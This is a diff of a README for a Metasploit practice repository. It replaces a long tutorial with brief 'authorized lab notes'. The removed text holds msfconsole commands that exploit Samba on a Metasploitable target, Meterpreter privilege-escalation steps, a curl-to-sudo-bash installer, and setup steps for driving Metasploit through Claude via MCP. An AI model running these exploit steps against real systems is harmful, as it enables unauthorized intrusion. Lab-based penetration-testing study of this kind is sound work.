@@ -1,356 +1,45 @@
-# Metasploit Penetration Testing Project
+# Authorized Metasploit Lab Notes
 
-<div align="center">
+Study notes from **authorized** Metasploit practice in an isolated lab (Kali + intentionally vulnerable VMs such as Metasploitable). This is a **portfolio write-up**, not a toolkit and not a how-to for attacking systems you do not own.
 
-![Metasploit](https://img.shields.io/badge/Metasploit-Framework-red?style=for-the-badge&logo=metasploit)
-![Python](https://img.shields.io/badge/Python-3.x-blue?style=for-the-badge&logo=python)
+![Lab](https://img.shields.io/badge/Scope-Authorized%20lab%20only-red?style=for-the-badge)
+![Python](https://img.shields.io/badge/Notes-Markdown-3776AB?style=for-the-badge)
 ![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)
 
-**A comprehensive penetration testing project demonstrating advanced Metasploit Framework exploitation techniques**
+## What this repo is
 
-[Features](#-features) • [Installation](#-installation) • [Usage](#-usage) • [Documentation](#-documentation) • [Screenshots](#-screenshots)
+- High-level phases of a typical pentest engagement (recon → validate → report)
+- Environment setup reminders for a home lab
+- Emphasis on **permission, isolation, and reporting**
 
-</div>
+## What this repo is not
 
----
+- Exploit code, payloads, or step-by-step attack procedures
+- Instructions for scanning or exploiting production or third-party systems
 
-## 📋 Table of Contents
+If you need those details, use official Metasploit / Offensive Security documentation **inside a lab you control**.
 
-- [Overview](#-overview)
-- [Features](#-features)
-- [Prerequisites](#-prerequisites)
-- [Installation](#-installation)
-- [Usage](#-usage)
-- [Project Structure](#-project-structure)
-- [Screenshots](#-screenshots)
-- [Documentation](#-documentation)
-- [Security & Ethics](#-security--ethics)
-- [Contributing](#-contributing)
-- [License](#-license)
+## Lab principles
 
-## 🎯 Overview
+1. **Written authorization** and a network that cannot reach the public internet by accident (host-only or isolated virtual LAN).
+2. **Document findings**, not “get a shell.” Screenshots and notes should support a report: asset, issue class, impact, remediation.
+3. **Patch and harden** the same services you studied: disable unused listeners, apply vendor updates, restrict management planes.
 
-This project demonstrates advanced penetration testing methodologies using the Metasploit Framework. It includes comprehensive exploitation techniques, post-exploitation activities, and security assessment procedures suitable for cybersecurity professionals and students.
+See [docs/methodology.md](docs/methodology.md) for the phase outline.
 
-The project covers:
-- **Vulnerability Assessment**: Identifying and analyzing security weaknesses
-- **Exploit Development**: Creating and deploying custom exploits
-- **Post-Exploitation**: Maintaining access and gathering intelligence
-- **Reporting**: Documenting findings and recommendations
+## Setup (lab VM only)
 
-## ✨ Features
-
-- 🔍 **Comprehensive Vulnerability Scanning**: Automated detection of security vulnerabilities
-- 💻 **Multi-Vector Exploitation**: Various attack vectors and payloads
-- 🎯 **Post-Exploitation Modules**: Advanced techniques for maintaining access
-- 📊 **Detailed Reporting**: Professional documentation of findings
-- 🛡️ **Defense Evasion**: Techniques for bypassing security controls
-- 🔐 **Credential Harvesting**: Secure handling and analysis of captured credentials
-- 📈 **Network Pivoting**: Advanced lateral movement techniques
-
-## 🔧 Prerequisites
-
-Before you begin, ensure you have the following installed:
-
-- **Kali Linux** or **Parrot Security OS** (recommended)
-- **Metasploit Framework** (v6.0+)
-- **Python 3.8+**
-- **VirtualBox/VMware** (for target machines)
-- **Metasploitable 2/3** (vulnerable target environment)
-
-### System Requirements
-
-- Minimum 4GB RAM (8GB recommended)
-- 20GB free disk space
-- Network connectivity for updates
-
-## 📦 Installation
-
-### 1. Clone the Repository
+- Hypervisor: VirtualBox or VMware
+- Attacker VM: Kali or equivalent, Metasploit Framework installed from the distro
+- Target VM: Metasploitable or another **intentionally vulnerable** image on the same isolated network
 
 ```bash
 git clone https://github.com/RajaWasim100/metasploit-penetration-testing.git
 cd metasploit-penetration-testing
 ```
 
-### 2. Install Metasploit Framework
+## Author
 
-```bash
-# On Kali Linux (pre-installed)
-msfconsole --version
+**Raja Wasim** — [github.com/RajaWasim100](https://github.com/RajaWasim100)
 
-# Manual installation
-curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb | sudo bash
-```
-
-### 3. Update Metasploit
-
-```bash
-sudo msfupdate
-```
-
-### 4. Install Dependencies
-
-```bash
-# Install Python dependencies (if any)
-pip3 install -r requirements.txt
-
-# Update Metasploit modules
-msfconsole -q -x "db_status; exit"
-```
-
-### 5. Setup Target Environment
-
-1. Download Metasploitable 2/3 from [SourceForge](https://sourceforge.net/projects/metasploitable/)
-2. Import into VirtualBox/VMware
-3. Configure network settings (NAT or Bridged)
-4. Note the target IP address
-
-## 🚀 Usage
-
-### Basic Workflow
-
-1. **Start Metasploit Console**
-
-```bash
-msfconsole
-```
-
-2. **Initialize Database**
-
-```bash
-msf6 > db_status
-msf6 > workspace -a metasploit_project
-```
-
-3. **Scan Target Network**
-
-```bash
-msf6 > db_nmap -sV -p 1-1000 <target_ip>
-```
-
-4. **Search for Exploits**
-
-```bash
-msf6 > search type:exploit platform:linux
-```
-
-5. **Select and Configure Exploit**
-
-```bash
-msf6 > use exploit/linux/samba/is_known_pipename
-msf6 > set RHOSTS <target_ip>
-msf6 > set LHOST <your_ip>
-msf6 > exploit
-```
-
-### Advanced Techniques
-
-#### Meterpreter Session Management
-
-```bash
-# Background current session
-meterpreter > background
-
-# List all sessions
-msf6 > sessions -l
-
-# Interact with session
-msf6 > sessions -i <session_id>
-
-# Upgrade to Meterpreter
-msf6 > use post/multi/manage/shell_to_meterpreter
-```
-
-#### Post-Exploitation
-
-```bash
-# System information gathering
-meterpreter > sysinfo
-meterpreter > getuid
-
-# Privilege escalation
-meterpreter > getsystem
-
-# Network enumeration
-meterpreter > ipconfig
-meterpreter > route
-```
-
-## 📁 Project Structure
-
-```
-metasploit-penetration-testing/
-│
-├── README.md                 # Project documentation
-├── LICENSE                   # License file
-├── .gitignore               # Git ignore rules
-│
-├── docs/                    # Documentation
-│   ├── Claude_Metasploit_Complete_Tutorial.docx
-│   └── methodology.md       # Testing methodology
-│
-├── images/                  # Screenshots and outputs
-│   ├── IMG_0235.png         # Exploitation screenshots
-│   ├── IMG_0236.png
-│   └── ...
-│
-├── scripts/                 # Custom scripts (if any)
-│   └── automation.sh
-│
-└── reports/                 # Generated reports
-    └── sample_report.md
-```
-
-## 📸 Screenshots
-
-This section documents the complete penetration testing workflow, from initial environment setup and configuration to active exploitation and security assessment procedures.
-
-### Phase 1: Environment Setup & Configuration
-
-<div align="center">
-
-**Step 1: Launch the Metasploitable VM**
-![Launch Metasploitable VM](images/IMG_0253.jpg)
-
-**Step 2: Identify the Metasploitable IP Address using ifconfig**
-![Identify Target IP](images/IMG_0255.jpg)
-
-**Step 3: Baseline Reconnaissance with Nmap**
-![Nmap Reconnaissance](images/IMG_0256.jpg)
-
-**Step 4: Claude Code and Claude Running in Kali**
-![Claude Integration](images/IMG_0257.jpg)
-
-**Step 5: Clone and Set Up MetasploitMCP**
-![MetasploitMCP Setup](images/IMG_0258.jpg)
-
-**Step 6: Start the Metasploit RPC Service**
-![RPC Service Start](images/IMG_0259.jpg)
-
-**Step 7: Configure Claude Desktop**
-![Claude Desktop Configuration](images/IMG_0260.jpg)
-
-**Step 8: Restart Claude Desktop**
-![Claude Desktop Restart](images/IMG_0261.jpg)
-
-**Step 9: MCP Validation**
-![MCP Validation](images/IMG_0262.jpg)
-
-</div>
-
-### Phase 2: Active Exploitation & Attack Phase
-
-<div align="center">
-
-**Vulnerability Exploitation & Initial Compromise**
-![Exploitation 1](images/IMG_0263.jpg)
-
-**Payload Delivery & Execution**
-![Exploitation 2](images/IMG_0264.jpg)
-
-**Meterpreter Session & Command Execution**
-![Exploitation 3](images/IMG_0265.jpg)
-
-**Post-Exploitation Enumeration**
-![Exploitation 4](images/IMG_0266.jpg)
-
-**Privilege Escalation Attempts**
-![Exploitation 5](images/IMG_0267.jpg)
-
-**Credential Harvesting & Data Collection**
-![Exploitation 6](images/IMG_0268.jpg)
-
-**Lateral Movement & Network Pivoting**
-![Exploitation 7](images/IMG_0269.jpg)
-
-**Final Assessment & Results**
-![Exploitation 8](images/IMG_0270.jpg)
-
-</div>
-
----
-
-*All screenshots demonstrate techniques performed in controlled lab environments for educational purposes. For additional documentation and detailed walkthroughs, refer to the [documentation](docs/) directory.*
-
-## 📚 Documentation
-
-Comprehensive documentation is available in the `docs/` directory:
-
-- **Complete Tutorial**: See `docs/Claude_Metasploit_Complete_Tutorial.docx` for detailed walkthrough
-- **Methodology**: Step-by-step penetration testing methodology
-- **Best Practices**: Security testing guidelines and recommendations
-
-## 🔒 Security & Ethics
-
-### ⚠️ Important Disclaimer
-
-This project is intended for **educational purposes only**. The techniques and tools demonstrated should only be used:
-
-- ✅ In authorized penetration testing engagements
-- ✅ In controlled lab environments
-- ✅ For educational and research purposes
-- ✅ With explicit written permission from system owners
-
-### ❌ Do NOT Use For:
-
-- Unauthorized access to systems
-- Illegal activities
-- Malicious purposes
-- Any activity that violates laws or regulations
-
-### Legal Compliance
-
-Users are responsible for ensuring compliance with all applicable laws and regulations. The authors and contributors of this project are not responsible for any misuse of the information provided.
-
-## 🤝 Contributing
-
-Contributions are welcome! Please follow these guidelines:
-
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to the branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
-
-### Contribution Guidelines
-
-- Follow the existing code style
-- Add comments for complex logic
-- Update documentation as needed
-- Test your changes thoroughly
-- Ensure ethical use compliance
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## 👤 Author
-
-**Raja Wasim**
-- GitHub: [@RajaWasim100](https://github.com/RajaWasim100)
-- LinkedIn: [Your LinkedIn](https://linkedin.com/in/yourprofile)
-- Email: your.email@example.com
-
-## 🙏 Acknowledgments
-
-- Rapid7 for the Metasploit Framework
-- The Metasploit community
-- Metasploitable project maintainers
-- All contributors and security researchers
-
-## 📊 Project Status
-
-![GitHub last commit](https://img.shields.io/github/last-commit/RajaWasim100/metasploit-penetration-testing?style=flat-square)
-![GitHub issues](https://img.shields.io/github/issues/RajaWasim100/metasploit-penetration-testing?style=flat-square)
-![GitHub stars](https://img.shields.io/github/stars/RajaWasim100/metasploit-penetration-testing?style=flat-square)
-
----
-
-<div align="center">
-
-**⭐ If you find this project helpful, please consider giving it a star! ⭐**
-
-Made with ❤️ for the cybersecurity community
-
-</div>
+Internship context: [Developershub](https://github.com/RajaWasim100/Developershub)
